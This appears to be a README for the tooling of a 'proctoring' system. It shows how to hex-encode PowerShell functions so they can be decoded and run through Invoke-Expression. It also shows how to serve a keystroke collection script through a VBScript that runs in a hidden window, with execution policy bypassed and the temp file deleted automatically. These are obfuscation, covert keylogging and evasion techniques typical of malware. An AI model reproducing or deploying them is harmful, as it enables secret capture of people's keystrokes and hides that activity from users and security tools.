# Tools
## 1. convertToHex.ps1

This tool is used to convert the functions.ps1 used in the proctoring script into hex so that it can be embedded into the proctoring script instead of being dot sourced.
After conversion, take the hex value generated and run it in the proctoring script
```
$hexFunctions = @"
    <insert hex value>
"@

# Convert the hex string back to byte array
$byteArray = @()
for ($i = 0; $i -lt $hexFunctions.Length; $i += 2) {
    $byteArray += [Convert]::ToByte($hexFunctions.Substring($i, 2), 16)
}

# Convert the byte array to string content
$decodedContent = [System.Text.Encoding]::UTF8.GetString($byteArray)

# Execute the decoded content
Invoke-Expression $decodedContent
```

## 2. create_vbs.py

This tool is used to automatically generate the VBScript file that is used to serve the keystroke collection script. You would have to provide the keystroke collection script's path inside the code.
After the .vbs file is generated, embed it in the proctoring functions located in get_encrypted_script.php to run it.

```
# Function: Execute the VBS content in memory
function Execute-VBSContent {
    param ($vbsContent)
    try {
        $tempVbsFilePath = [System.IO.Path]::GetTempFileName() + ".vbs"
        Set-Content -Path $tempVbsFilePath -Value $vbsContent

        # Execute the VBS script using cscript.exes
        $command = "cscript.exe //B `"$tempVbsFilePath`""
        $null = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {Start-Sleep -Seconds 5; Remove-Item -Path `"$tempVbsFilePath`" -Force}`"" -WindowStyle Hidden

        Write-Host "Executing VBS file..."
        Start-Process -FilePath "cscript.exe" -ArgumentList "//B `"$tempVbsFilePath`"" -WindowStyle Hidden
    } catch {
        Write-Host "Failed to execute VBS content: $_"
        exit
    }
}
```